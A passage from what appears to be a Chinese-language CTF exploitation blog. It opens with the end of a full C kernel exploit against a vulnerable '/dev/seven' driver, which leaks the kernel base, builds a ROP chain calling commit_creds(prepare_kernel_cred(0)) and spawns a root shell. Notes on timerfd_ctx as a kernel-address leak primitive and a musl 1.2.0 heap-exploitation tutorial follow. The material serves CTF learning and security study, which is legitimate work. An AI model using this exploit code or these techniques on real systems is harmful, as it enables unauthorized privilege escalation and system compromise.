class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(description, <span class="string">&quot;%d&quot;</span>, id);</span><br><span class="line">    <span class="keyword">return</span> key_id[id] = syscall(__NR_add_key, <span class="string">&quot;user&quot;</span>, description, payload, payload_len - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_key_payload), KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_update</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *payload, <span class="type">size_t</span> plen)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UPDATE, key_id[id], payload, plen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_read</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *bufer, <span class="type">size_t</span> buflen)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, key_id[id], bufer, buflen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_revoke</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, key_id[id], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_unlink</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UNLINK, key_id[id], KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_SIZE 0x80</span></span><br><span class="line"><span class="type">int</span> seven_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">object_alloc</span><span class="params">()</span> &#123;</span><br><span class="line">    ioctl(seven_fd, <span class="number">0x5555</span>, <span class="number">0x80</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">object_delete</span><span class="params">()</span> &#123;</span><br><span class="line">    ioctl(seven_fd, <span class="number">0x6666</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">object_show</span><span class="params">()</span> &#123;</span><br><span class="line">    ioctl(seven_fd, <span class="number">0x7777</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[OBJ_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125; msgbuf;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff8108c360</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff811884e7</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81C00DF0</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff8108c780</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rdi_rax_rep_ret = <span class="number">0xffffffff81aed04b</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rcx_ret = <span class="number">0xffffffff8101ed83</span>;</span><br><span class="line"><span class="type">size_t</span> xchg_esp_eax_ret = <span class="number">0xffffffff81011cb0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> success = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    success = <span class="literal">true</span>;</span><br><span class="line">    <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">edit_subprocess_info</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) buf = xchg_esp_eax_ret;</span><br><span class="line">    <span class="keyword">while</span> (!success) &#123;</span><br><span class="line">        write(seven_fd, buf, <span class="number">0x20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    bind_core(<span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">    signal(SIGSEGV, (<span class="type">void</span> *) get_shell);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    seven_fd = open(<span class="string">&quot;/dev/seven&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (seven_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open seven.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> *buf = (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, <span class="number">0x4000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> msqid = get_msg_queue();</span><br><span class="line">    write_msg(msqid, &amp;msgbuf, <span class="keyword">sizeof</span>(msgbuf.mtext), <span class="number">1</span>);</span><br><span class="line">    object_alloc();</span><br><span class="line">    object_delete();</span><br><span class="line">    read_msg(msqid, &amp;msgbuf, <span class="keyword">sizeof</span> msgbuf.mtext, <span class="number">1</span>);</span><br><span class="line">    key_alloc(<span class="number">0</span>, buf, <span class="number">0x80</span>);</span><br><span class="line">    object_delete();</span><br><span class="line">    socket(<span class="number">22</span>, AF_INET, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] key read len: %d\n&quot;</span>, key_read(<span class="number">0</span>, buf, <span class="number">-1</span>));</span><br><span class="line">    qword_dump(<span class="string">&quot;leak kernel addr from subprocess_info&quot;</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = *(<span class="type">size_t</span> *) buf - <span class="number">0xffffffff8107e910</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset;</span><br><span class="line">    prepare_kernel_cred += kernel_offset;</span><br><span class="line">    mov_rdi_rax_rep_ret += kernel_offset;</span><br><span class="line">    pop_rcx_ret += kernel_offset;</span><br><span class="line">    xchg_esp_eax_ret += kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *rop = (<span class="type">void</span> *) (xchg_esp_eax_ret &amp; <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">    mmap((<span class="type">void</span> *) rop - <span class="number">0x3000</span>, <span class="number">0x6000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    *rop++ = pop_rdi_ret;</span><br><span class="line">    *rop++ = <span class="number">0</span>;</span><br><span class="line">    *rop++ = prepare_kernel_cred;</span><br><span class="line">    *rop++ = pop_rcx_ret;</span><br><span class="line">    *rop++ = <span class="number">0</span>;</span><br><span class="line">    *rop++ = mov_rdi_rax_rep_ret;</span><br><span class="line">    *rop++ = commit_creds;</span><br><span class="line">    *rop++ = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x16</span>;</span><br><span class="line">    rop++;</span><br><span class="line">    rop++;</span><br><span class="line">    *rop++ = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    *rop++ = user_cs;</span><br><span class="line">    *rop++ = user_rflags;</span><br><span class="line">    *rop++ = user_sp;</span><br><span class="line">    *rop++ = user_ss;</span><br><span class="line">    <span class="type">pthread_t</span> t;</span><br><span class="line">    pthread_create(&amp;t, <span class="literal">NULL</span>, edit_subprocess_info, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">while</span> (!success) &#123;</span><br><span class="line">        usleep(<span class="number">1</span>);</span><br><span class="line">        socket(<span class="number">22</span>, AF_INET, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="timerfd_ctx-与-timerfd-系列系统调用">timerfd_ctx 与 timerfd
系列系统调用</h1>
<p>自 2.6.25 版本起 Linux
提供了一种可以用以创建定时器的系统调用——timerfd
系列系统调用，相比起定时器的功能，我们更加关注系统调用过程中涉及到的
<code>timerfd_ctx</code> 结构体</p>
<h2 id="timerfd_ctxkmalloc-256-gpf_kernel">timerfd_ctx（kmalloc-256 |
GPF_KERNEL）</h2>
<p>该结构体定义于 <code>fs/timerfd.c</code> 中，如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timerfd_ctx</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hrtimer</span> <span class="title">tmr</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">alarm</span> <span class="title">alarm</span>;</span></span><br><span class="line">    &#125; t;</span><br><span class="line">    <span class="type">ktime_t</span> tintv;</span><br><span class="line">    <span class="type">ktime_t</span> moffs;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> wqh;</span><br><span class="line">    u64 ticks;</span><br><span class="line">    <span class="type">int</span> clockid;</span><br><span class="line">    <span class="type">short</span> <span class="type">unsigned</span> expired;</span><br><span class="line">    <span class="type">short</span> <span class="type">unsigned</span> settime_flags;    <span class="comment">/* to show in fdinfo */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">clist</span>;</span></span><br><span class="line">    <span class="type">spinlock_t</span> cancel_lock;</span><br><span class="line">    <span class="type">bool</span> might_cancel;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>其中的 <code>hrtimer</code> 结构体定义于
<code>/include/linux/hrtimer.h</code> 中，如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hrtimer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timerqueue_node</span>        <span class="title">node</span>;</span></span><br><span class="line">    <span class="type">ktime_t</span>                _softexpires;</span><br><span class="line">    <span class="keyword">enum</span> <span class="title function_">hrtimer_restart</span>        <span class="params">(*function)</span><span class="params">(<span class="keyword">struct</span> hrtimer *)</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hrtimer_clock_base</span>    *<span class="title">base</span>;</span></span><br><span class="line">    u8                state;</span><br><span class="line">    u8                is_rel;</span><br><span class="line">    u8                is_soft;</span><br><span class="line">    u8                is_hard;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h3 id="分配释放-4">分配/释放</h3>
<p>我们可以通过 <code>timerfd_create</code> 系统调用来分配一个
<code>timerfd_ctx</code> 结构体，在 <code>fs/timerfd.c</code>
中有如下定义：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE2(timerfd_create, <span class="type">int</span>, clockid, <span class="type">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ufd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timerfd_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    ctx = kzalloc(<span class="keyword">sizeof</span>(*ctx), GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>同样地，对于 timerfd 文件在 <code>fs/timerfd.c</code>
中定义了其函数表 <code>timerfd_ops</code>，如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">timerfd_fops</span> =</span> &#123;</span><br><span class="line">    .release    = timerfd_release,</span><br><span class="line">    .poll        = timerfd_poll,</span><br><span class="line">    .read        = timerfd_read,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .show_fdinfo    = timerfd_show,</span><br><span class="line">    .unlocked_ioctl    = timerfd_ioctl,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>timerfd_release</code> 定义于 <code>fs/timerfd.c</code>
中，如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">timerfd_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timerfd_ctx</span> *<span class="title">ctx</span> =</span> file-&gt;private_data;</span><br><span class="line"></span><br><span class="line">    timerfd_remove_cancel(ctx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isalarm(ctx))</span><br><span class="line">        alarm_cancel(&amp;ctx-&gt;t.alarm);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        hrtimer_cancel(&amp;ctx-&gt;t.tmr);</span><br><span class="line">    kfree_rcu(ctx, rcu);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>即我们可以通过关闭 timerfd 文件来释放 timerfd_ctx 结构体。</p>
<h4 id="数据泄露-8">数据泄露</h4>
<ul>
<li><p>内核 .text 段地址</p>
<p>timerfd_ctx 的 tmr 字段的 <code>function</code>
字段指向内核代码段，若能泄漏出该指针则我们便毫无疑问能泄漏出内核基址。</p></li>
<li><p>内核线性映射区（ direct mapping area）</p>
<p>timerfd_ctx 的 tmr 字段的 <code>base</code>
字段指向内核“堆”上，若能泄露该字段我们同样能泄漏出内核的“堆上地址”。</p></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>musl pwn</title>
    <url>/2024/11/08/musl-pwn/</url>
    <content><![CDATA[<h1 id="调试环境搭建">调试环境搭建</h1>
<h2 id="debug-musl">debug musl</h2>
<p><a class="link"   href="https://gitcode.net/qq_45323960/debug_musl" >debug_musl <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
可以源码调试。 运行 <code>setup.sh</code>
将源码及相关动态链接库解压到根目录下 <code>musl</code>
文件夹下，用的时候只需要将对应版本的 <code>libc.so</code>
文件复制到目录下，然后利用 patchelf 运行如下命令修改可执行文件所依赖的
ld 为 <code>libc.so</code> 即可进行源码调试。 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./libc.so ./pwn</span><br></pre></td></tr></table></figure></div>
另外该项目中的 <code>build.sh</code> 可以自动下载和编译 musl
到根目录下的 <code>musl</code> 文件夹中，建议在 ubuntu16.04 下编译。</p>
<h2 id="muslheap">muslheap</h2>
<p>还有一个 gdb 插件 <a class="link" 
 href="https://github.com/xf1les/muslheap" >muslheap <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
可以在使用调试版的 <code>libc.so</code> 时打印堆信息。安装命令如下：
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/xf1les/muslheap.git</span></span><br><span class="line">echo <span class="string">&quot;source /path/to/muslheap.py&quot;</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure></div> muslheap 插件支持如下命令： - mchunkinfo: Examine a
mallocng-allocated memory (slot) - mfindslot: Find out the slot where
the given memory is inside - mheapinfo: Display mallocng allocator
internal information - mmagic: Display the location of important
functions and sensitive variables in musl libc # 源码阅读环境搭建 在阅读
musl 代码时可以借助 <a class="link"   href="https://www.jetbrains.com/clion/" >clion <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
进行代码分析，不过要想让 clion 正确分析 musl 代码需要进行如下配置：</p>
<p>首先最好将 musl
的源码解压到另一个目录下而不是复用前面调试环境用的源码，因为如果在阅读代码时改变了源码的格式会造成调试的时候代码对应错误。</p>
<p>在用 clion 打开 musl 源码后首先在 Mskefile
设置中配置如下命令，注意一定要点命令窗口左上角的箭头将窗口展开后再粘贴，否则格式会出现错误。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a161e46807709141532c7359c446df73.png"
                     
alt="在这里插入图片描述" 
                > <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># GNU Autotools template, feel free to customize.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="built_in">which</span> autoreconf &gt;/dev/null &amp;&amp; autoreconf --install --force --verbose <span class="string">&quot;<span class="variable">$&#123;PROJECT_DIR:-..&#125;</span>&quot;</span> 2&gt;&amp;1; /bin/sh <span class="string">&quot;<span class="variable">$&#123;PROJECT_DIR:-..&#125;</span>/configure&quot;</span></span></span><br></pre></td></tr></table></figure></div> 在构建窗口右键点击重新加载
Makefile 项目。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/71b255162ba4fa0aacdf2b8c866e498b.png"
                     
alt="在这里插入图片描述" 
                > 中间弹出的窗口不选择清理项目即可。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4b836efc96472420ba7752ecc4c49699.png"
                     
alt="在这里插入图片描述" 
                > 此时 clion
虽然可以分析代码，但是分析的不完全，比如下图中的类型就找不到。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/7cb1784e6a7e38c10aca8d31d36829c8.png"
                     
alt="在这里插入图片描述" 
                > 将代码编译一下后就可以正常识别。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f34147490ba5326506e6897e5a85647d.png"
                     
alt="在这里插入图片描述" 
                > 此时 clion
已经可以正常分析代码，比如结构体中成员的大小和偏移都可以分析出来。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/73e29def8928117dc98c8825e36ce7a3.png"
                     
alt="在这里插入图片描述" 
                > # musl heap (musl-1.2.0) musl
libc在内存分配上经历过一次大的改动（1.2.0-&gt;1.2.1），其余版本之间变化不大，这里以
1.2.0 版本为例进行分析。 ## 基本数据结构 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4fd3cac91e50e4115e7bba510fb30cb0.png"
                     
alt="在这里插入图片描述" 
                > ### mal</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">uint64_t</span> binmap;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></figure></div>
<p><code>mal</code> 结构体类似于 glibc 中的 <code>arena</code>
，记录着堆的状态，有三个成员：64位无符号整数 <code>binmap</code>
，链表头部数组 <code>bins</code> 和锁 <code>free_lock</code> 。 -
<code>binmap</code>记录每个 bin 是否为非空，若某个比特位为 1，表示对应的
bin 为非空，即 bin 链表中有 chunk。 - <code>bins[64]</code> 为 64 个
<code>chunk</code> 的链表头，分别维护 64 个存放空闲 <code>chunk</code>
的双向链表。每个下标对应的链表存放 <code>chunk</code> 的大小范围如下。 |
index | min size | max size (+0x1F) | | ----- | -------- |
---------------- | | 0 | 0x20 | 0x20 | | 1 | 0x40 | 0x40 | | 2 | 0x60 |
0x60 | | 3 | 0x80 | 0x80 | | 4 | 0xa0 | 0xa0 | | 5 | 0xc0 | 0xc0 | | 6 |
0xe0 | 0xe0 | | 7 | 0x100 | 0x100 | | 8 | 0x120 | 0x120 | | 9 | 0x140 |
0x140 | | 10 | 0x160 | 0x160 | | 11 | 0x180 | 0x180 | | 12 | 0x1a0 |
0x1a0 | | 13 | 0x1c0 | 0x1c0 | | 14 | 0x1e0 | 0x1e0 | | 15 | 0x200 |
0x200 | | 16 | 0x220 | 0x220 | | 17 | 0x240 | 0x240 | | 18 | 0x260 |
0x260 | | 19 | 0x280 | 0x280 | | 20 | 0x2a0 | 0x2a0 | | 21 | 0x2c0 |
0x2c0 | | 22 | 0x2e0 | 0x2e0 | | 23 | 0x300 | 0x300 | | 24 | 0x320 |
0x320 | | 25 | 0x340 | 0x340 | | 26 | 0x360 | 0x360 | | 27 | 0x380 |
0x380 | | 28 | 0x3a0 | 0x3a0 | | 29 | 0x3c0 | 0x3c0 | | 30 | 0x3e0 |
0x3e0 | | 31 | 0x400 | 0x400 | | 32 | 0x420 | 0x420 | | 33 | 0x440 |
0x520 | | 34 | 0x540 | 0x620 | | 35 | 0x640 | 0x720 | | 36 | 0x740 |
0x820 | | 37 | 0x840 | 0xa20 | | 38 | 0xa40 | 0xc20 | | 39 | 0xc40 |
0xe20 | | 40 | 0xe40 | 0x1020 | | 41 | 0x1040 | 0x1420 | | 42 | 0x1440 |
0x1820 | | 43 | 0x1840 | 0x1c20 | | 44 | 0x1c40 | 0x2020 | | 45 | 0x2040
| 0x2820 | | 46 | 0x2840 | 0x3020 | | 47 | 0x3040 | 0x3820 | | 48 |
0x3840 | 0x4020 | | 49 | 0x4040 | 0x5020 | | 50 | 0x5040 | 0x6020 | | 51
| 0x6040 | 0x7020 | | 52 | 0x7040 | 0x8020 | | 53 | 0x8040 | 0xa020 | |
54 | 0xa040 | 0xc020 | | 55 | 0xc040 | 0xe020 | | 56 | 0xe040 | 0x10020
| | 57 | 0x10040 | 0x14020 | | 58 | 0x14040 | 0x18020 | | 59 | 0x18040 |
0x1c020 | | 60 | 0x1c040 | 0x20020 | | 61 | 0x20040 | 0x28020 | | 62 |
0x28040 | 0x30020 | | 63 | 0x30040 | 0x38000 | ### bin <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="type">int</span> lock[<span class="number">2</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
存放空闲 <code>chunk</code> 的双向链表，存放 <code>chunk</code> 从
<code>tail</code> 端放，取 <code>chunk</code> 从 <code>head</code>
端取。 <code>bin</code> 中的 <code>head</code> 和 <code>tail</code>
初始为 0 ，但是在使用 <code>bin</code> 时一般会先调用
<code>lock_bin</code> ，此时如果 <code>bin</code> 为空会将
<code>head</code> 和 <code>tail</code> 设为
<code>&amp;bin[i] - 0x10</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">lock_bin</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">    lock(mal.bins[i].lock);</span><br><span class="line">    <span class="keyword">if</span> (!mal.bins[i].head)</span><br><span class="line">        mal.bins[i].head = mal.bins[i].tail = BIN_TO_CHUNK(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="chunk">chunk</h3>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">	<span class="type">size_t</span> psize, csize;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p><code>chunk</code> 头部结构跟 glibc 差不多，不过没有
<code>nextsize</code> 指针，<code>chunk</code> 之间不重用
<code>psize</code> 字段。 <code>psize</code> 和 <code>csize</code>
字段都有标志位（glibc 只有 <code>size</code>
字段有），但只有一种位于最低位的标志位 <code>C_INUSE</code>（glibc
最低三位都有标志位）。若 <code>csize</code> 设置 <code>C_INUSE</code>
标志位（最低位为 1 ），表示 <code>chunk</code> 正在被使用；若没有设置
<code>C_INUSE</code> 标志位（最低位为 0 ），表示 <code>chunk</code>
已经被释放或者通过 mmap 分配的，需要通过 <code>psize</code>
的标志位来进一步判断 <code>chunk</code> 的状态。若 <code>psize</code>
设置 <code>C_INUSE</code> 标志位表示前一个 <code>chunk</code>
正在被使用。 另外，<code>chunk</code> 的大小关于 0x20 对齐。 #### 宏定义
<code>chunk</code> 的相关宏定义如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_ALIGN (4*sizeof(size_t))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_MASK (-SIZE_ALIGN)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OVERHEAD (2*sizeof(size_t))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMAP_THRESHOLD (0x1c00*SIZE_ALIGN)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DONTCARE 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RECLAIM 163840</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNK_SIZE(c) ((c)-&gt;csize &amp; -2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNK_PSIZE(c) ((c)-&gt;psize &amp; -2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_CHUNK(c) ((struct chunk *)((char *)(c) - CHUNK_PSIZE(c)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_CHUNK(c) ((struct chunk *)((char *)(c) + CHUNK_SIZE(c)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEM_TO_CHUNK(p) (struct chunk *)((char *)(p) - OVERHEAD)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNK_TO_MEM(c) (void *)((char *)(c) + OVERHEAD)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BIN_TO_CHUNK(i) (MEM_TO_CHUNK(&amp;mal.bins[i].head))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> C_INUSE  ((size_t)1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))</span></span><br></pre></td></tr></table></figure></div> #### unbin 将
<code>chunk</code> 从 <code>bins</code> 中取出，并更新
<code>binmap</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unbin</span><span class="params">(<span class="keyword">struct</span> chunk *c, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">        a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span> &lt;&lt; i));</span><br><span class="line">    c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">    c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    c-&gt;csize |= C_INUSE;</span><br><span class="line">    NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> <strong>当满足
<code>c-&gt;prev != c-&gt;next</code> 时可以不将 <code>mal.binmap</code>
清空。</strong> #### alloc_fwd &amp; alloc_rev</p>
